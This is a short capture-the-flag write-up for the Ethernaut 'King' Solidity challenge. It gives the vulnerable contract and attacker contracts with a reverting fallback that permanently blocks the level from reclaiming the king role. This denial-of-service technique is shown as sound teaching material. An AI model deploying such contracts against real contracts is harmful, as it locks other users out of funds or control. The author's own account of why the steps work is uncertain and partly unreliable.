# King
```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

In this challenge, you'll see contract construct itself as owner & king.

Who paid more on it will become king (not owner), you should remain `king` value as your account or any other contract's address.

As `require(msg.value >= prize || msg.sender == owner);`, once you submit, level will get king back cause to its ownership.

King contract's fallback function will payback your payment and reset `king`'s and `prize`'s value for level.

Here's the point, `<address>.transfer()` can be reject and then return `false` to terminate the fallback function.

So, obviously, we should deploy a new contract which has a always reject payment's fallback function and can send some ether to target King contract.

```javascript
fromWei((await contract.prize()).toNumber())
// 1 ether
```

```javascript
pragma solidity ^0.4.18;

contract dosKing {

    function dosKing() public payable{}

    function freeMoney(address param) public {
        param.call.value(1.001 ether)();
    }
    function myBalance() public view returns(uint) {
        return address(this).balance;
    }
    function refill() public payable {
    }
    function () public {
        revert();
    }
}
```

![](https://i.imgur.com/BAcW3BL.png)

This seems fail in transition to ethernaut instance, but you can get you money back before you drop this ccontract.

```javascript
pragma solidity ^0.4.18;

contract dosKing {
    function dosKing(address param) public payable{
        param.call.gas(10000000).value(msg.value)();
    }
}
```

![](https://i.imgur.com/xsQ1s45.png)

This work fine.

```javascript
contract.sendTransaction({value:toWei(1.0001)})
```

This is most odd solution, why won't instance payback my money after I summit it to level?

This challenge remain question, maybe due to Solidity's update?

I will back to this misc, if I find out the answer.